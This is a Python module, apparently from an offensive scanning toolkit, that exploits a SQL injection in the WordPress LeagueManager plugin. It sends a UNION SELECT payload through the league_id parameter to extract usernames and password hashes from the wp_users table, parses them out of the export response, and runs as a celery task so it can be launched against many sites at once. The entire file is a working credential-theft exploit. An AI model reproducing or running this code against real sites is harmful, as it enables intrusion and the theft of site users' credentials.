from arachne.base import Chooser
from arachne.utils import celery_output
from arachne.browser import Browser
from arachne.celery import celery
from re import findall

name = 'wp-leaguemanager'
def base_wp_leaguemanager(url, browser_args):
    b = Browser(name, **browser_args)

    params = {'league_id' : '7 UNION SELECT ALL user_login,2,3,4,5,6,7,8,9,10,11,12,13,user_pass,15,16,17,18,19,20,21,22,23,24 from wp_users--',
                'mode' : 'teams',
                'leaguemanager_export' : 'Download+File'}
    r = b.go(url, data=params)

    match = findall('21\t(.*)\t2.*0\t(.*)\t15', r.text)
    if match:
        return ':'.join(match[0])

@celery.task(name='arachne.scripts.exploit_wp_leaguemanager')
def exploit_wp_leaguemanager(url, browser_args, job_name, out_name):
    out = base_wp_leaguemanager(url, browser_args)
    if out:
        celery_output.delay(out, name, job_name, out_name)

class BaseWpLeagueManager( Chooser ):
    def __init__(self):
        desc = 'Exploits LeagueManager plugin on wordpress sites.'
        super(BaseWpLeagueManager, self).__init__(name, desc)

    def init_async(self, cls, obj):
        obj.core = exploit_wp_leaguemanager

    def init_local(self, cls, obj):
        obj.core = base_wp_leaguemanager

def main():
    s = BaseWpLeagueManager()
    s.start()

if __name__ == "__main__":
    main()
